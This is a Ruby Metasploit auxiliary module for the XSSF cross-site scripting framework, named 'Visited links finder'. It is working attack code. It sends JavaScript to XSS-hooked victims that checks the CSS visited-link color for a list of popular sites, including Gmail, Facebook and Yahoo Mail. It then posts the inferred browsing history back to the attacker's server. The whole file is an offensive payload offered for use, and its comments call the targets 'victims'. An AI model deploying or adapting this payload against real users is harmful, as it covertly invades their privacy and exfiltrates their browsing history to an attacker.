require 'msf/core'
require 'msf/base/xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Visited links finder',
			'Description' => 'Search if a list of webpages havec been visited by the victims'
		))
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
	
		code = %Q{
			var urls = new Array(
				"http://www.google.com",
				"http://mail.yahoo.com",
				"http://www.myspace.com",
				"http://www.yahoo.com",
				"http://mail.live.com",
				"http://www.ebay.com",
				"http://search.yahoo.com",
				"http://www.facebook.com",
				"http://www.msn.com",
				"http://www.youtube.com",
				"http://www.gmail.com",
				"http://wikipedia.org",
				"http://images.google.com",
				"http://mail.aol.com",
				"http://search.msn.com",
				"http://news.yahoo.com",
				"http://my.yahoo.com",
				"http://address.yahoo.com"
			);
			
			var response = ''
			
			function hasLinkBeenVisited(url) {
				var link = document.createElement('a');
				link.href = url;
				document.body.appendChild(link);
				
				var color = null;
				
				if (link.currentStyle)
					color = link.currentStyle.color;
				else {
					link.setAttribute("href",url);
					var computed_style = document.defaultView.getComputedStyle( link, null );
					if (computed_style)
						color = computed_style.color
				}

				if (color)
					if (document.defaultView && document.defaultView.getComputedStyle) //Firefox
						(document.defaultView.getComputedStyle(link, null).color == 'rgb(85, 26, 139)') ? response += 'VISITED : ' + url + '\\n' : response += 'NOT VISITED : ' + url + '\\n'
					else if (link.currentStyle) //IE
						(link.currentStyle["color"] == "red") ? response += 'VISITED : ' + url + '\\n' : response += 'NOT VISITED : ' + url + '\\n'
					else //try and get inline style
						(link.style["color"] == "red") ? response += 'VISITED : ' + url + '\\n' : response += 'NOT VISITED : ' + url + '\\n'
				else
					response += 'NOT VISITED : ' + url + '\\n'
				
				document.body.removeChild(link);
			}
			
			var x = urls.length;
			for (i = 0 ; i < x ; i++)
				hasLinkBeenVisited(urls[i]);
			
			XSSF_POST(response, '#{self.name}');			
		}
	

		send_response(cli, code)
	end
end